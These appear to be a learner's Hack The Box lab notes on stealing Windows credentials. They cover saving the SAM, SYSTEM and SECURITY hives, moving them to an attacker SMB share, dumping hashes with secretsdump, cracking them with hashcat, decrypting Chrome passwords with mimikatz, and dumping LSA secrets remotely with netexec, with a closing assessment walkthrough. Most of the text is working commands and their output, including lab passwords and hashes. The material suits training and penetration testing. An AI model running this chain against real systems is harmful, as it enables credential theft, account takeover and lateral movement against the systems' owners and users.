With `administrative access` on a `Windows system`, you can quickly dump the files tied to the `SAM database`, transfer them to your attack machine, and start cracking the `hashes` offline. Doing it offline means you don’t need to keep an active connection to the target, giving you more freedom and stealth.

---
## Registry hives

There are three `registry hives` you can copy with `local administrative access` to a target system. Each plays a key role in dumping and cracking `password hashes`. Here’s a quick rundown of their purposes:

| Registry Hive   | Description                                                                                                                                                             |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`      | Contains `password hashes` for local user accounts. These `hashes` can be `extracted and cracked` to reveal `plaintext passwords.`                                      |
| `HKLM\SYSTEM`   | Stores the `system boot key`, which is used to `encrypt the SAM database`. This key is required to `decrypt the hashes`.                                                |
| `HKLM\SECURITY` | Contains sensitive information used by the` Local Security Authority (LSA)`, including `cached domain credentials (DCC2)`, `cleartext passwords, DPAPI keys`, and more. |
We can back up these hives using the `reg.exe` utility.

---
#### Using reg.exe to copy registry hives

By launching `cmd.exe` with `administrative privileges`, we can use `reg.exe` to save copies of the `registry hives`. Run the following commands:

```Powershell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

If the goal is only to extract `local user` hashes, copy `HKLM\SAM` and `HKLM\SYSTEM`; `HKLM\SECURITY` is optional but useful because it can contain `cached domain user credentials` and other artifacts on `domain-joined` systems. Save the `registry hives` offline so they can be processed and cracked without an active session on the target.

A common workflow is to export the hive files locally, then transfer the `hive copies` to your attacker host. One simple way is to host a share with Impacket’s `smbserver` and use basic `CMD` commands on the target to push the files to that share. For example: `python3 smbserver.py share /path/to/dir` on the attacker, and `copy C:\Windows\System32\config\SAM \\attacker\share\` from the target.

Once the `hives` are on your attack host, use your preferred offline tools to extract and crack the `password hashes` (e.g., `secretsdump.py`, `bkhive`/`samdump2`, or hashcat/john for cracking). Doing this offline avoids maintaining a live connection to the `Windows system` and reduces detection risk.

---
## Creating a share with smbserver

To create a share with `Impacket’s smbserver`, run the server with the `share name` and the `local directory` you want exported, and e`nable SMB2` support so modern `Windows` clients can connect. This exposes a `\\<attacker>\CompData` share backed by `/home/ltnbob/Documents`. The `-smb2support` flag forces `SMB2` compatibility; without it many modern `Windows` hosts will refuse to connect because `SMBv1` is disabled by default due to its severe vulnerabilities.

```bash 
OathBornX@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.
#### Moving hive copies to share

```powershell
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

---
## Dumping hashes with secretsdump

```bash
OathBornX@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up... 
```

Here we see that `secretsdump` successfully dumped the `local` `SAM hashes`, along with data from `hklm\security`, including `cached domain logon information` and `LSA secrets` such as the machine and `user keys` for `DPAPI`.

```bash
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

Most modern `Windows` systems store `passwords` as `NT hashes`. Older versions (pre-`Windows Vista` / `Windows Server 2008`) may also contain weaker `LM hashes`, which are much faster to `crack`. When you extract registry or hive dumps, identify which `hash` type each `user account` has, copy the `NT hashes` (and any `LM hashes` if present) into a text file, and keep the `username` ↔ `hash` mapping so you can track cracked results back to accounts.

---

## Cracking hashes with Hashcat

This approach builds practical familiarity with `Hashcat`—when to use it, which `hash type` maps to which `hashcat mode`, and which `options` (like `wordlists`, `rules`, or `masks`) are appropriate for your captured `hashes`. Refer to the `Hashcat` documentation for the exact `mode` numbers and recommended `options` for each `hash type`, and keep your `username`↔`hash` mapping so `cracked credentials` can be attributed correctly.

```bash
OathBornX@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

---
## Running Hashcat against NT hashes

Covering every `Hashcat` mode is out of scope here, so we’ll focus on the `-m` option with mode `1000`, which corresponds to `NT hashes` (`NTLM`). For the full list of modes and details, check the `Hashcat` wiki or run the `man` page on your machine.

```bash
OathBornX@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                

<...SNIP>
```

`Hashcat` successfully cracked three `hashes`. Those `passwords` can be reused to access other `systems` on the `network` because many `users` practice `password` reuse. This technique is valuable during `assessments`: if you gain `administrative` rights on a vulnerable `Windows system` and `dump` the `SAM` database to extract `NT hashes`, you can crack them offline with `Hashcat` and attempt lateral access using the cracked `credentials`.

---
## DCC2 Hashes

`HKLM\SECURITY` is a `registry hive` that holds cached `domain` logon data, typically stored as `DCC2` hashes, local, salted/iterated hashed copies of network `credential` hashes used for `offline/domain` logons.

```bash
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

`DCC2` hashes are significantly harder to crack than `NT` hashes because they use `PBKDF2` (salted, iterated hashing), which increases computational cost per guess. Unlike raw `NT` hashes (Hashcat mode `1000`), `DCC2` requires Hashcat mode `2100`.

`DCC2` hashes cannot be abused with `Pass-the-Hash` style `lateral techniques` because the stored value is a derived, `salted/iterated` copy of the `network credential` rather than the `raw NT hash` usable for `authentication`. In practice this means cracking `DCC2` is slower and often needs targeted wordlists or GPU time, but successful cracks still yield plaintext `passwords` that can enable further access if reused elsewhere.

```bash
OathBornX@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt

<SNIP>

$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords
```

---
## DPAPI

Alongside the `DCC2` hashes, the dump from `HKLM\SECURITY` also includes the `machine` and `user` keys for `DPAPI` (Data Protection Application Programming Interface).

`DPAPI` is a collection of `Windows APIs` used to `encrypt` and `decrypt` `data blobs` on a per-user basis. These `blobs` are `small encrypted data structures` used by both built-in `Windows components` and third-party `applications` to securely store sensitive information like saved `credentials`, `certificates`, and browser `passwords`.

| Applications                | Use of DPAPI                                                                                      |
| --------------------------- | ------------------------------------------------------------------------------------------------- |
| `Internet Explorer`         | `Password` form auto-completion data (username and password for saved sites).                     |
| `Google Chrome`             | `Password` form auto-completion data (username and password for saved sites).                     |
| `Outlook`                   | `Passwords` for email accounts.                                                                   |
| `Remote Desktop Connection` | Saved `credentials` for connections to` remote machines`.                                         |
| `Credential Manager`        | Saved `credentials` for `accessing shared resources`, joining `Wireless networks, VPNs and more`. |

`DPAPI`-encrypted `credentials` can be `decrypted` manually using tools like `Impacket`'s `dpapi` module, `Mimikatz`, or remotely with `DonPAPI`. To decrypt you generally need the user's `master key` or the `machine`/`user` `DPAPI` keys (often obtained from `HKLM\SECURITY`). `Mimikatz` supports local and in-memory extraction; `Impacket dpapi` can `decrypt blobs` when provided keys; `DonPAPI` enables `remote DPAPI operations`. Use these `techniques` only in authorized assessments.

```powershell
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```

---
## Remote dumping & LSA secrets considerations

With `credentials` that have `local administrator` privileges, you can target `LSA secrets` remotely over the network. This lets you extract sensitive data like `service account passwords`, `scheduled task credentials`, or other `passwords` stored by applications in the `LSA secrets` store—often a goldmine for `lateral movement or privilege escalation`.
#### Dumping LSA secrets remotely

```bash
OathBornX@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```
#### Dumping SAM Remotely

Similarly, we can use `netexec` to `dump hashes` from the `SAM database` remotely.

```bash
OathBornX@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```

---------

# ASSESSMENT

```bash
#Setup SMBshare on attackhost

#exfil SAM,SEC,SYS to attackhost

#Offline cracking
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[*] Cleaning up... 

#Cracking the Hashes
hashcat -m 1000 hashes.txt "$ROCKYOU"

a3ecf31e65208382e23b3420a34208fc:mommy1                   
c02478537b9727d391bc80011c2e2321:matrix                   
31d6cfe0d16ae931b73c59d7e0c089c0:                         
58a478135a93ac3bf058a5ea0e8fdb71:Password123 

#Dump LSA Secrets
netexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False) 
SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\Bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping LSA secrets
SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumped 2 LSA secrets to /home/haz0x/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2025-11-13_105249.secrets and /home/haz0x/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2025-11-13_105249.cached



```
